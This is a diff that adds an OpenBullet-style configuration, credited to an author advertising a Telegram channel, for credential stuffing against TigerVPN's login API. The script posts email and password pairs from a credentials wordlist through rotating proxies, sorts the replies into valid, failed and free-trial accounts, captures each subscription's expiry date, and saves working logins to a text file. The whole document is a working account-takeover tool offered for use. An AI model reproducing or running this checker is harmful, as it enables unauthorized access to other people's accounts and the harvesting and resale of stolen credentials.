@@ -1,0 +1,59 @@
+[SETTINGS]
+{
+  "Name": "Tigervpn",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-11-17T04:44:26.6081383-08:00",
+  "AdditionalInfo": "Telegram Channel : T.me/ghoulblack",
+  "RequiredPlugins": [],
+  "Author": "👑LilTOBA👑",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "Credentials",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://www.tigervpn.com/api/v3/auth/login.json" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "Content-Length: 57" 
+  HEADER "Host: www.tigervpn.com" 
+  HEADER "Connection: close" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: okhttp/3.10.0" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{\"status\":\"error" 
+    KEY "\"message\":\"Username or password incorrect.\"" 
+  KEYCHAIN Success OR 
+    KEY "{\"status\":\"success" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"is_trial\":true" 
+
+#Expire PARSE "<SOURCE>" JSON "expires_at" CreateEmpty=FALSE -> CAP "Expire" 
+
+UTILITY File "TigerVpn.txt" AppendLines "<USER>: <PASS> //\\n =============================" 
+
